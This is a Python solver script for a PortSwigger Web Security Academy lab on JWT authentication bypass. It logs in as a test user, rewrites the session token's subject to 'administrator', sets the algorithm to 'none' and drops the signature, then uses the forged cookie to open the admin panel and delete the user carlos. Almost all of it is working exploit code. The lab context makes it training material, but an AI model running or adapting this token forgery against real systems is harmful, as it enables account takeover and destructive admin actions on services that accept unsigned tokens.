# JWT authentication bypass via flawed signature verification

# https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import base64
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	return r

def decode_jwt_token(token):
	enc_h, enc_b, sig = token.split('.')
	h = base64.urlsafe_b64decode(enc_h+("="*(len(enc_h) % 4))).decode()
	print('\n - Token Headers:\t%s' % h)
	b = base64.urlsafe_b64decode(enc_b+("="*(len(enc_b) % 4))).decode()
	print(' - Token Body:\t\t%s' % b)
	print(' - Token Signature:\t%s\n' % sig)
	return (h, b, sig)

def encode_jwt_token(h: dict, b: dict, sig: str):
	enc_h = base64.b64encode(h.encode()).decode().split('=')[0]
	print('\n - Encoded Headers:\t%s' % enc_h)
	enc_b = base64.b64encode(b.encode()).decode().split('=')[0]
	print(' - Encoded Body:\t\t%s' % enc_b)
	print(' - Encoded Signature:\t%s\n' % sig)
	return f'{enc_h}.{enc_b}.{sig}'

def get_jwt_token(s):
	token = s.cookies['session']
	print('\n[+] Found JWT session token:\t%s' % token)
	return token

def delete_carlos(s, url, token):
	print('\n[+] Trying to access to the Admin Panel with the new JWT...')
	time.sleep(1)
	cookies = {'session': token}
	r = s.get(url+'/admin', cookies=cookies)
	if '/admin/delete' in r.text:
		print('[+] Trying to delete Carlos account with the new JWT...')
		r = s.get(url + '/admin/delete?username=carlos', cookies=cookies)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: JWT authentication bypass via flawed signature verification')
	parser = argparse.ArgumentParser(description="[+] Lab: JWT authentication bypass via flawed signature verification")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete carlos account...\n')
			time.sleep(1)
			r = connect_as_wiener(s, url)
			time.sleep(2)
			token = get_jwt_token(s)
			print('\n[+] Decoded token values:')
			h, b, sig = decode_jwt_token(token)
			jwt_body = b.replace('"sub":"wiener"', '"sub":"administrator"')
			jwt_header = h.replace('"alg":"RS256"', '"alg":"none"')
			jwt_sig = ''
			print('\n[+] Replacing our user by admin, setting the algorithm to none, removing the signature and reencode the token')
			new_token = encode_jwt_token(jwt_header, jwt_body, jwt_sig)
			print('[+] New token values:')
			decode_jwt_token(new_token)
			print('[+] New JWT Session Cookie:\t%s' % new_token)
			delete_carlos(s, url, new_token)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
